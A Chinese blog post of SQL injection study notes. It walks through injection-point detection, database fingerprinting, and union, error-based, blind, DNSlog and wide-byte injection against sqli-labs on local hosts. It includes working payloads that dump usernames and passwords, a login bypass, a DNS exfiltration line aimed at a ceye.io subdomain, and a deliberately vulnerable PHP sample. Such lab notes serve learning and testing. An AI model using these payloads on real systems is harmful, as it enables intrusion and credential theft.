@@ -1,0 +1,853 @@
+<!--There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!-->
+
+
+
+	<!DOCTYPE html>
+	<html>
+		
+
+<head>
+	<title>SQL注入学习笔记</title>
+	<meta charset="utf-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="apple-mobile-web-app-title" content="Amaze UI" />
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+    <meta name="author" content="vint">
+    <meta name="keywords" content="" />
+    <meta name="description" content="" />
+   	<!-- css -->
+	<link rel="stylesheet" href="/css/style.css">	
+	<!-- code -->
+	<link rel="stylesheet" href="//cdn.bootcss.com/highlight.js/9.2.0/styles/github.min.css">	
+	<!-- favicon -->
+	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
+	<!-- font-awesome -->
+	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+</head>
+
+
+
+	<body>	
+		<!--Preloader-->
+<div id="preloader">
+	<div id="status">
+		<img alt="preloader" src="/img/logo.png">
+	</div>
+</div>
+<!--Preloader end-->
+
+
+	<header>
+
+	
+		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
+	
+		
+		
+ 		<p class="motto"></p>
+	
+	
+	
+		
+			<p class="page-name">SQL注入学习笔记</p>
+		
+		
+	
+</header>
+
+<div id="cd-nav">
+	<a href="#0" class="cd-nav-trigger">Menu<span></span></a>
+
+	<nav id="cd-main-nav">
+		<ul>
+			
+      		<li class="fa fa-/">
+           		<a href="/" title="主页">主页</a>	
+      		</li>
+    		
+      		<li class="fa fa-/archives">
+           		<a href="/archives" title="归档">归档</a>	
+      		</li>
+    		
+      		<li class="fa fa-/categories">
+           		<a href="/categories" title="分类">分类</a>	
+      		</li>
+    		
+      		<li class="fa fa-/tags">
+           		<a href="/tags" title="标签">标签</a>	
+      		</li>
+    		
+      		<li class="fa fa-/about">
+           		<a href="/about" title="关于">关于</a>	
+      		</li>
+    		
+      		<li class="fa fa-/gallery">
+           		<a href="/gallery" title="相册">相册</a>	
+      		</li>
+    		
+    		
+        	
+            	<li><a href="javascript:;" class="popup-trigger" title="Search">搜索</a></li>
+        	
+		</ul>
+	</nav>
+</div>
+
+
+		<main>
+		<div class="page-container">
+		
+    <!-- content srart -->
+<div class="am-g am-g-fixed blog-fixed blog-content">
+	<div class="am-u-md-8 am-u-sm-12">
+
+		<article class="am-article blog-article-p">
+			<div class="am-article-hd">
+				
+
+
+				<h1 class="am-article-title blog-text-center">
+					
+					
+	
+		<a href="/2018/10/28/2018.10.27/" itemprop="url">		
+			SQL注入学习笔记		
+		</a>
+	
+
+
+
+				</h1>
+
+				<p class="am-article-meta blog-text-center">
+					<span>
+						<i class="fa fa-clock-o"></i> 
+						<a href="/2018/10/28/2018.10.27/" itemprop="url">
+	<time datetime="2018-10-27T16:00:00.000Z" itemprop="datePublished">
+  		2018-10-28
+  </time>
+</a>    
+&nbsp
+					</span>
+					<span>						
+						
+							<i class="fa fa-tags"></i>
+							
+								<a href="#笔记" title="笔记" rel="2">笔记</a>&nbsp
+													 											
+						
+					</span>	
+				</p>
+			</div>	
+
+			<div class="am-article-bd">
+				<div class="content">
+					<p>SQL注入一直都是web应用层上的高危漏洞之一，在此做一次SQL注入系统学习的笔记。</p>
+<p># </p>
+<h1 id="1-SQL注入原理"><a href="#1-SQL注入原理" class="headerlink" title="1.SQL注入原理"></a>1.SQL注入原理</h1><p>所谓SQL注入，就是攻击者把SQL命令插入到web表单的输入域或者页面请求的查询字符串，进而欺骗服务器执行恶意的SQL命令。</p>
+<h1 id="2-判断是否是能进行sql注入"><a href="#2-判断是否是能进行sql注入" class="headerlink" title="2.判断是否是能进行sql注入"></a>2.判断是否是能进行sql注入</h1><h2 id="0x01-单引号判断常规注入点"><a href="#0x01-单引号判断常规注入点" class="headerlink" title="0x01 单引号判断常规注入点"></a>0x01 单引号判断常规注入点</h2><p>http:xxx.com/1.php?id=1’</p>
+<p>在参数后面加单引号，这是最常用且最简单的测试方法，如果页面返回错误，则存在sql注入漏洞。</p>
+<h2 id="0x02-数字型注入点"><a href="#0x02-数字型注入点" class="headerlink" title="0x02 数字型注入点"></a>0x02 数字型注入点</h2><p>http:xxx.com/1.php?id=1 and 1=1 返回正常</p>
+<p>http:xxx.com/1.php?id=1 and 1=2 返回错误</p>
+<h2 id="0x03-字符型注入点"><a href="#0x03-字符型注入点" class="headerlink" title="0x03  字符型注入点"></a>0x03  字符型注入点</h2><p>http:xxx.com/1.php?id=1‘ and ’1‘=’1 返回正常</p>
+<p>http:xxx.com/1.php?id=1‘ and ‘1’=‘2 返回错误</p>
+<h2 id="0x04-搜索型注入点"><a href="#0x04-搜索型注入点" class="headerlink" title="0x04  搜索型注入点"></a>0x04  搜索型注入点</h2><p>http:xxx.com/1.php?keyword=vint%’ and 1=1 and ‘%’=’% 返回正常</p>
+<p>http:xxx.com/1.php?keyword=vint%’ and 1=2 and ‘%’=’% 放回错误</p>
+<p>假设我们的SQL查询语句是这样的</p>
+<p>SELECT * FROM table WHERE keyword like ‘%$keyword%’</p>
+<p>这里的$keyword是用户的输入</p>
+<p>当我们传入keyword=vint%’ and 1=1 and ‘%’=’%</p>
+<p>该查询语句最终则是这样的</p>
+<p>SELECT * FROM table WHERE keyword like ‘%vint%’ and 1=1 and ‘%’=’%’</p>
+<p>SELECT * FROM table WHERE keyword like ‘%vint%’ and 1=2 and ‘%’=’%’</p>
+<h1 id="3-判断数据库类型"><a href="#3-判断数据库类型" class="headerlink" title="3.判断数据库类型"></a>3.判断数据库类型</h1><p>在SQL注入前需先判断数据库的类型，因为不同的数据库，SQL注入的方法也不尽相同。</p>
+<h2 id="0x01-一般数据库搭配"><a href="#0x01-一般数据库搭配" class="headerlink" title="0x01 一般数据库搭配"></a>0x01 一般数据库搭配</h2><p>常见的数据库有oracle，mysql，sqlserver，access，mssql，mongodb等。</p>
+<p>现在主流的数据库搭配，最常出现的就是access+asp，或者sqlserver+asp，还有mysql+php。</p>
+<p>其中，在现在来说出现得最多的又是mysql+php。</p>
+<h2 id="0x02-基于特定函数的判断"><a href="#0x02-基于特定函数的判断" class="headerlink" title="0x02 基于特定函数的判断"></a>0x02 基于特定函数的判断</h2><p>‘len和length’</p>
+<p>在mssql和mysql中，返回长度值师通过调用len()函数实现的。而在oracle中则是调用length()。</p>
+<p>当使用 and len(‘a’)=1的时候，页面返回正常则数据库类型可能为mssql或者mysql。</p>
+<p>@@version和version()</p>
+<p>@@version和version()在mysql中可以返回当前版本的信息。</p>
+<p>如果version()&gt;1返回与@@version&gt;1页面相同时，则可能为mysql。如果出现提示为version()错误，则可能是mssql。</p>
+<p>substring和substr</p>
+<p>在msslq中可以调用substring。oracle则只可以调用substr</p>
+<h2 id="0x03-基于辅助的符号的判断"><a href="#0x03-基于辅助的符号的判断" class="headerlink" title="0x03 基于辅助的符号的判断"></a>0x03 基于辅助的符号的判断</h2><p>“/*”是MySQL中的注释符，返回错误说明该注入点不是MySQL</p>
+<p>“;”是子句查询标识符，Oracle不支持多行查询，因此如果返回错误，则说明很可能是Oracle数据库。</p>
+<p>在注入点后加（必须为注入点）;–（一个分号，两个横线），例如：<a href="https://link.jianshu.com?t=http://xxxx/article/as.asp?id=1;--" target="_blank" rel="noopener">http://xxxx/article/as.asp?id=1;–</a>。如果返回正常的话，说明数据库是MSSQL。在MSSQL数据库中;和–都是存在的，;用来分离两个语句，而–就是注释符，它后面语句都不执行。如果返回错误，基本可以肯定是ACCESS数据库了。</p>
+<h2 id="0x04-基于显示错误信息判断（常用）"><a href="#0x04-基于显示错误信息判断（常用）" class="headerlink" title="0x04 基于显示错误信息判断（常用）"></a>0x04 基于显示错误信息判断（常用）</h2><p>在注入点后直接加上单引号，根据服务器的报错信息来判断数据库。</p>
+<h1 id="4-SQL注入的分类"><a href="#4-SQL注入的分类" class="headerlink" title="4.SQL注入的分类"></a>4.SQL注入的分类</h1><h2 id="0x01-GET-注入"><a href="#0x01-GET-注入" class="headerlink" title="0x01 GET 注入"></a>0x01 GET 注入</h2><p>顾名思义，get参数传递类型的SQL注入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.254.150/sqli-labs/Less-1/?id=1</span><br></pre></td></tr></table></figure>
+<p><img src="/post/10.28/1.png" alt="1"></p>
+<h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><p>在id=1后加单引号，页面报错，存在注入</p>
+<p><img src="/post/10.28/2.png" alt="img"></p>
+<p>猜字段数</p>
+<p>（1）可以用order by猜字段数</p>
+<p><a href="http://192.168.254.150/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.254.150/sqli-labs/Less-1/?id=1&#39;</a> order by 3 %23</p>
+<p><img src="/post/10.28/3.png" alt="img"></p>
+<p><a href="http://192.168.254.150/sqli-labs/Less-1/?id=1&#39;" target="_blank" rel="noopener">http://192.168.254.150/sqli-labs/Less-1/?id=1&#39;</a> order by 4 %23</p>
+<p><img src="/post/10.28/4.png" alt="img"></p>
+<p>（2）也可以用union select 来猜字段数</p>
+<p>（UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p>
+<p>UNION 内部的 SELECT 语句必须拥有相同数量的列）</p>
+<p><a href="http://192.168.254.150/sqli-labs/Less-1/?id=" target="_blank" rel="noopener">http://192.168.254.150/sqli-labs/Less-1/?id=</a> 1’ union select 1,2,3 %23</p>
+<p><img src="/post/10.28/5.png" alt="img"></p>
+<h3 id="爆表"><a href="#爆表" class="headerlink" title="爆表"></a>爆表</h3><p><a href="http://192.168.254.150/sqli-labs/Less-1/?id=" target="_blank" rel="noopener">http://192.168.254.150/sqli-labs/Less-1/?id=</a> -1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</p>
+<p><img src="/post/10.28/6.png" alt="img"></p>
+<h3 id="分析："><a href="#分析：" class="headerlink" title="分析："></a>分析：</h3><p>（1）mysql的数据库</p>
+<p>information_schema：系统数据库</p>
+<p>SCHEMATA：储存mysql所有数据库的基本信息，包括数据库名，编码类型路径等。</p>
+<p>TABLES：储存mysql中的表信息，包括这个表是基本表还是系统表，数据库的引擎是什么，表有多少行，创建时间，最后更新时间等。</p>
+<p>COLUMNS：储存mysql中表的列信息，包括这个表的所有列以及每个列的信息，该列是表中的第几列，列的数据类型，列的编码类型，列的权限，列的注释等。</p>
+<p>（2）通过在mysql-front实验可以看到，查询information_schema中的信息时，使用where语句值不能直接用英文，要用单引号包裹着，当然用十六进制表示也可以。</p>
+<p><img src="/post/10.28/7.png" alt="img"></p>
+<p>（3）注意这里的id=1要改为id=-1</p>
+<p>看下源代码</p>
+<p><img src="/post/10.28/8.png" alt="img"></p>
+<p>这里调用了一次mysql_fetch_array()，而mysql_fetch_array()只会从查询的结果取得一组行为关联数组或者数字数组在相应的调用处返回第一行的结果。而解决方法就是只要让    第一行查询的结果（即union左边的查询结果）为空，</p>
+<p>那么union 右边查询的结果自然就成了第一行，就可以在页面得到我们所查询得到的结果。</p>
+<p>因此，只要id=-1或者其他不存在的数字，就可以使union左边的查询结果为空。</p>
+<p>（4）group_concat函数</p>
+<p>group_concat()会计算哪些行属于同一组,将属于同一组的列显示出来。要返回哪些列,由函数参数(就是字段名)决定。分组必须有个标准,就是根据groupby指定的列进行分组。</p>
+<h3 id="爆列"><a href="#爆列" class="headerlink" title="爆列"></a>爆列</h3><p><a href="http://192.168.254.150/sqli-labs/Less-1/?id=" target="_blank" rel="noopener">http://192.168.254.150/sqli-labs/Less-1/?id=</a> -1’ union select 1,group_concat(column_name),3 from information_schema.columns where table_name=’users’ %23</p>
+<p><img src="/post/10.28/9.png" alt="img"></p>
+<h3 id="爆字段"><a href="#爆字段" class="headerlink" title="爆字段"></a>爆字段</h3><p><a href="http://192.168.254.150/sqli-labs/Less-1/?id=" target="_blank" rel="noopener">http://192.168.254.150/sqli-labs/Less-1/?id=</a> -1’ union select 1,group_concat(username,’:’,password),3 from users%23</p>
+<p><img src="/post/10.28/10.png" alt="img"></p>
+<h2 id="0x02-POST-注入"><a href="#0x02-POST-注入" class="headerlink" title="0x02 POST 注入"></a>0x02 POST 注入</h2><p>其实POST注入跟GET注入大同小异，只不过是在用burp抓包的情况下检测注入，在post参数里插payload检测注入；</p>
+<p><img src="/post/10.28/11.png" alt="img"></p>
+<p>burp抓包</p>
+<p><img src="/post/10.28/12.png" alt="img"></p>
+<p>在参数后加单引号测试是否报错</p>
+<p><img src="/post/10.28/13.png" alt="img"></p>
+<p>发现报错了，存在注入</p>
+<p><img src="/post/10.28/14.png" alt="img"></p>
+<p>看下源码，方便更好地理解post注入</p>
+<p><img src="/post/10.28/15.png" alt="img"></p>
+<p>$sql=”SELECT username, password FROM users WHERE username=’$uname’ and password=’$passwd’ LIMIT 0,1”;</p>
+<p>这里可以在uname参数值后加’ or 1=1 #</p>
+<p><img src="/post/10.28/16.png" alt="img"></p>
+<p>就可以直接登录进去了</p>
+<p><img src="/post/10.28/17.png" alt="img"></p>
+<p>分析：当uname参数值为1’ or 1=1 #时，查询的sql语句就变为了SELECT username, password FROM users WHERE username=’1’ or 1=1 #’ and password=’$passwd’ LIMIT 0,1</p>
+<p>由于#把后面的sql语句都给注释了，而or 1=1永真，所以最后就注入成功了。</p>
+<p>同样，在passwd参数注入也是可以的</p>
+<p>payload:passwd=1’ or ‘1’=’1</p>
+<p><img src="/post/10.28/18.png" alt="img"></p>
+<p>则最终的查询语句则变成了</p>
+<p>SELECT username, password FROM users WHERE username=’1’ and password=’1’ or ‘1’=’1’ LIMIT 0,1；</p>
+<p>分析：这里and运算优先级高于or，所以先运算and，而后or运算，最终则0 or 1，返回1，注入成功。</p>
+<h2 id="0x03-cookie-注入"><a href="#0x03-cookie-注入" class="headerlink" title="0x03 cookie 注入"></a>0x03 cookie 注入</h2><p>其实cookie注入的原理与上面提到的get、post注入一样，只不过这里的参数改为以cookie的反式提交了，所以同样可以用burp抓包测试cookie注入。</p>
+<p>另外形成cookie注入的条件有两个：</p>
+<p>1.未对cookie提交的参数进行过滤；</p>
+<p>2.程序用的是request（）方式，未指明使用request对象的具体方法进行获取。</p>
+<p>用admin账号的cookie来进行测试注入</p>
+<p><img src="/post/10.28/19.png" alt="img"></p>
+<p>刷新用burp抓包</p>
+<p><img src="/post/10.28/20.png" alt="img"></p>
+<p>用单引号测试注入</p>
+<p><img src="/post/10.28/21.png" alt="img"></p>
+<p>发现报错了</p>
+<p><img src="/post/10.28/22.png" alt="img"></p>
+<p>后面就跟普通的get、post注入一样了，猜字段数，爆表，爆列，爆字段值。这些就不说了。</p>
+<h2 id="0x04-报错注入"><a href="#0x04-报错注入" class="headerlink" title="0x04 报错注入"></a>0x04 报错注入</h2><p>说到报错注入，这里就不得不提起一些跟报错注入息息相关的函数。</p>
+<p>1.floor()</p>
+<p>select <em> from text where id=1 and (select 1 from (select count(</em>),concat(user(),0x3a,floor(rand(0)*2))as a from information_schema.tables group by a)b);</p>
+<p><img src="/post/10.28/23.png" alt="img"></p>
+<p>这里有一篇文章对这种报错注入讲解的很好：<a href="https://blog.csdn.net/qq_32400847/article/details/53453098" target="_blank" rel="noopener">https://blog.csdn.net/qq_32400847/article/details/53453098</a></p>
+<p>2.extractvalue()</p>
+<p>extractvalue(xml_frag,xpath_expr)</p>
+<p>extractvalue()接受两个字符串参数，一个xml标记xml_frag的片段和一个xpath表达式xpath_expr(也称为定位符)。这个函数返回第一个文本节点的文本。我们可以在xpath中填写获得我们想要的信息的语句。</p>
+<p>select * from test where id=1 and (extractvalue(1,concat(0x3a,(select database())))) %23</p>
+<p><img src="/post/10.28/24.png" alt="img"></p>
+<p>3.updatexml()</p>
+<p>updatexml(xml_target,xpath_expr,new_xml)</p>
+<p>此函数用新的xml片段new_xml替换xml标记xml_target的给定片段的单个部分，然后返回更改的xml。 所有三个参数应该是字符串。我们可以在xpath中填写获得我们想要的信息的语句。</p>
+<p>select * from test where id=1 and (updatexml(1,concat(0x3a,(select database()),0x3a),1));</p>
+<p><img src="/post/10.28/25.png" alt="img"></p>
+<h2 id="0x05-布尔注入"><a href="#0x05-布尔注入" class="headerlink" title="0x05 布尔注入"></a>0x05 布尔注入</h2><p>需要了解的函数</p>
+<p>exit() 用于检查子查询是否有返回数据。结果时ture或false</p>
+<p>ascii() 把字符转化成ascii码</p>
+<p>substr(str,pos,len): 从pos开始的位置，截取len个字符</p>
+<p>1.判断数据库版本号</p>
+<p>select ascii(substr((select database()),1,1))</p>
+<p><img src="/post/10.28/26.png" alt="img"></p>
+<p>返回正常，ascill&gt;114</p>
+<p><img src="/post/10.28/27.png" alt="img"></p>
+<p>返回错误，ascii !&gt;115，说明database()的第一个字符的ascii值为115</p>
+<p><img src="/post/10.28/28.png" alt="img"></p>
+<p>ascii值为115的字符为“s”，后面就继续测试出其他的就可以了</p>
+<p>后面的也都一样，暴表，暴列，暴字段。</p>
+<h2 id="0x06-UNION注入"><a href="#0x06-UNION注入" class="headerlink" title="0x06 UNION注入"></a>0x06 UNION注入</h2><p>这种注入其实在上面提到的第一种注入get注入种已经用到了。</p>
+<p>这里再简单的做下笔记：union的作用就是将两个select 查询结果合并。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/?id= -1&apos; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() %23</span><br></pre></td></tr></table></figure>
+<p>group_concat():一次性显示查询到的所有值</p>
+<p>limit: 逐一显示</p>
+<h2 id="0x07-基于时间盲注"><a href="#0x07-基于时间盲注" class="headerlink" title="0x07 基于时间盲注"></a>0x07 基于时间盲注</h2><p>基于的原理是，当对数据库进行查询操作，如果查询的条件不存在，语句执行的时间便是0.但往往语句执行的速度非常快，线程信息一闪而过，得到的执行时间基本为0.</p>
+<p>于是sleep（N）这个语句在这种情况下起到了非常大的作用。</p>
+<p> Select sleep（N）可以让此语句运行n秒钟。但是如果查询语句的条件不存在，执行的时间便是0，利用该函数这样一个特殊的性质，可以利用时间延迟来判断我们查询的是否存在。这便是SQL基于时间延迟的盲注的工作原理。</p>
+<p>常用的判断语句:</p>
+<p>‘ and if(1=0,1, sleep(10)) –+ 或’ and if(1=0,1, sleep(10)) %23</p>
+<p>这里先说一下mysql种if语句的用法:if(exp1,exp2,exp3)，如果exp1为ture,则返回exp2,否则将返回exp3。</p>
+<p><img src="/post/10.28/29.png" alt="img"></p>
+<p><img src="/post/10.28/29.png" alt="img"></p>
+<p>可以看到这里延时了10秒，证明存在注入点</p>
+<p>接着后面的步骤也都大同小异，简单做下payload的笔记：</p>
+<h3 id="1-爆数据库的版本长度"><a href="#1-爆数据库的版本长度" class="headerlink" title="1.爆数据库的版本长度"></a>1.爆数据库的版本长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(length((version()))=6,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+<h3 id="2-爆数据库版本的第一个字符"><a href="#2-爆数据库版本的第一个字符" class="headerlink" title="2.爆数据库版本的第一个字符"></a>2.爆数据库版本的第一个字符</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr(version(),1,1))=53,sleep(10),1)–+</p>
+<h3 id="3-爆第一个数据库的长度"><a href="#3-爆第一个数据库的长度" class="headerlink" title="3.爆第一个数据库的长度"></a>3.爆第一个数据库的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(length((select schema_name from information_schema.schemata limit 0,1))=18,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+<h3 id="4-爆第一个数据库的第一个字符"><a href="#4-爆第一个数据库的第一个字符" class="headerlink" title="4.爆第一个数据库的第一个字符"></a>4.爆第一个数据库的第一个字符</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))=105,sleep(10),1)–+</p>
+<p>这里通过改变limit后的值来确定第几个数据库，第一个数据库的下标为0，依次往后推就是其他的数据库</p>
+<h3 id="5-爆security数据库里的第四个表的长度"><a href="#5-爆security数据库里的第四个表的长度" class="headerlink" title="5.爆security数据库里的第四个表的长度"></a>5.爆security数据库里的第四个表的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(length((select table_name from information_schema.tables where table_schema=&apos;security&apos; limit 3,1))=5,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+<h3 id="6-爆security数据库里的第四个表的第一个字符"><a href="#6-爆security数据库里的第四个表的第一个字符" class="headerlink" title="6.爆security数据库里的第四个表的第一个字符"></a>6.爆security数据库里的第四个表的第一个字符</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 3,1),1,1))=117,sleep(10),1)–+</p>
+<h3 id="7-爆security数据库里的users表的第二个字段长度"><a href="#7-爆security数据库里的users表的第二个字段长度" class="headerlink" title="7.爆security数据库里的users表的第二个字段长度"></a>7.爆security数据库里的users表的第二个字段长度</h3><p><a href="http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and" target="_blank" rel="noopener">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&#39;and</a> If(length((select column_name from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 1,1))=8,sleep(10),1)–+</p>
+<h3 id="8-爆security数据库里的users表的第二个字段的第一个字符"><a href="#8-爆security数据库里的users表的第二个字段的第一个字符" class="headerlink" title="8.爆security数据库里的users表的第二个字段的第一个字符"></a>8.爆security数据库里的users表的第二个字段的第一个字符</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(ascii(substr((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;users&apos; limit 1,1),1,1))=117,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+<h3 id="9-爆security数据库里的users表的第二个字段的第一个数据的长度"><a href="#9-爆security数据库里的users表的第二个字段的第一个数据的长度" class="headerlink" title="9.爆security数据库里的users表的第二个字段的第一个数据的长度"></a>9.爆security数据库里的users表的第二个字段的第一个数据的长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:6868/sqli-labs-master/Less-5/?id=1&apos;and If(length((select username from security.users limit 0,1))=4,sleep(10),1)--+</span><br></pre></td></tr></table></figure>
+<p>-——————– </p>
+<p>（这里只做下布尔盲注和时间盲注的手工注入笔记，一般遇到这两种注入的话，手工太过于繁琐，最好用python脚本跑，这里就不贴出代码了）</p>
+<h2 id="0x08-Dnslog盲注"><a href="#0x08-Dnslog盲注" class="headerlink" title="0x08 Dnslog盲注"></a>0x08 Dnslog盲注</h2><p>首先需要有一个可以配置的域名，比如：ceye.io，然后通过代理商设置域名 ceye.io 的 nameserver 为自己的服务器 A，然后再服务器 A 上配置好 DNS Server，这样以来所有 ceye.io 及其子域名的查询都会到 服务器 A 上，这时就能够实时地监控域名查询请求了，图示如下。</p>
+<p><img src="/post/10.28/30.png" alt="img"></p>
+<p>DNS在解析的时候会留下日志，咱们这个就是读取多级域名的解析日志，来获取信息</p>
+<p>通过DNSlog盲注需要用的load_file()函数，所以一般得是root权限。show variables like ‘%secure%’;查看load_file()可以读取的磁盘。</p>
+<p>1、当secure_file_priv为空，就可以读取磁盘的目录。</p>
+<p>2、当secure_file_priv为G:\，就可以读取G盘的文件。</p>
+<p>3、当secure_file_priv为null，load_file就不能加载文件。</p>
+<p><img src="/post/10.28/31.png" alt="img"></p>
+<p>通过设置my.ini来配置。secure_file_priv=””就是可以load_flie任意磁盘的文件。</p>
+<p><img src="/post/10.28/32.png" alt="img"></p>
+<p>在mysql命令行执行：select load_file(‘\\afanti.xxxx.ceye.io\aaa’);其中afanti就是要注入的查询语句</p>
+<p>查看平台，dnsLog被记录下来。</p>
+<p><img src="/post/10.28/33.png" alt="img"></p>
+<p>load_file()函数可以通过dns解析请求。</p>
+<p>以sql-labs第五关：</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and if((select load_file(concat(&apos;\\\\&apos;,(select database()),&apos;.xxxxx.ceye.io\\abc&apos;))),1,0)-- -+</span><br></pre></td></tr></table></figure>
+<p>执行的sql语句：SELECT * FROM users WHERE id=’1’ and if((select load_file(concat(‘\\‘,(select database()),’.xxxxx.ceye.io\abc’))),1,0)</p>
+<p>查看dnslog日志，发现security数据库被查询出来：</p>
+<p><img src="/post/10.28/34.png" alt="img"></p>
+<h2 id="0x09-二次注入"><a href="#0x09-二次注入" class="headerlink" title="0x09 二次注入"></a>0x09 二次注入</h2><p>二次注入其实在上面已经运用过了，就是报错注入的第一种方法，floor()函数那种注入方法。</p>
+<p>这里再把二次注入单独出来，是想让自己从不同的角度去理解sql注入。</p>
+<p>这里就不再赘述了，贴下payload：</p>
+<p>select <em> from text where id=1 and (select 1 from (select count(</em>),concat(user(),0x3a,floor(rand(0)*2))as a from information_schema.tables group by a)b);</p>
+<h2 id="0x10-宽字节注入"><a href="#0x10-宽字节注入" class="headerlink" title="0x10 宽字节注入"></a>0x10 宽字节注入</h2><p>涉及到的基本概念</p>
+<p>1.字符、字符集 </p>
+<p>字符(character)是组成字符集(character set)的基本单位。对字符赋予一个数值(encoding)来确定这个字符在该字符集中的位置。</p>
+<p>2、UTF8 </p>
+<p>由于ASCII表示的字符只有128个，因此网络世界的规范是使用UNICODE编码，但是用ASCII表示的字符使用UNICODE并不高效。因此出现了中间格式字符集，被称为通用转换格式，及UTF(Universal Transformation Format)。</p>
+<p>3、宽字节 </p>
+<p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，实际上只有两字节。宽字节带来的安全问题主要是吃ASCII字符(一字节)的现象，即将两个ascii字符误认为是一个宽字节字符。</p>
+<p>宽字节注入原理：</p>
+<p>GBK 占用两字节</p>
+<p>ASCII占用一字节</p>
+<p>PHP中编码为GBK，函数执行添加的是ASCII编码（添加的符号为“\”），MYSQL默认字符集是GBK等宽字节字符集。</p>
+<p>大家都知道%df’ 被PHP转义（开启GPC、用addslashes函数，或者icov等），单引号被加上反斜杠\，变成了 %df\’，其中\的十六进制是 %5C ，那么现在 %df\’ =%df%5c%27，如果程序的默认字符集是GBK等宽字节字符集，则MySQL用GBK的编码时，会认为 %df%5c 是一个宽字符，也就是縗，也就是说：%df\’ = %df%5c%27=縗’，有了单引号就好注入了。</p>
+<p>举例子：</p>
+<p>以下是一个存在宽字符注入漏洞的PHP程序。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$name=$_GET[&apos;name&apos;];</span><br><span class="line"></span><br><span class="line">$name=addslashes($name);</span><br><span class="line"></span><br><span class="line">$conn=mysql_connect(&apos;localhost&apos;,&apos;root&apos;,&apos;root&apos;);</span><br><span class="line"></span><br><span class="line">if($conn==null)&#123;exit(&quot;connect error !&lt;br&gt;&quot;);&#125;</span><br><span class="line"></span><br><span class="line">mysql_query(&quot;SET NAMES &apos;gbk&apos;&quot;,$conn);</span><br><span class="line"></span><br><span class="line">mysql_select_db(&quot;aaa&quot;,$conn);</span><br><span class="line"></span><br><span class="line">$sql=&quot;select * from a1 where name=&apos;&quot;.$name.&quot;&apos;&quot;;</span><br><span class="line"></span><br><span class="line">$result=mysql_query($sql,$conn);</span><br><span class="line"></span><br><span class="line">while($val=mysql_fetch_row($result))&#123;</span><br><span class="line"></span><br><span class="line">    print_r($val);</span><br><span class="line"></span><br><span class="line">    print(&quot;&lt;br&gt;&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这个PHP程序的SQL注入POC为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/test/t3.php?name=a%df&apos; or 1=1; %20%23</span><br></pre></td></tr></table></figure>
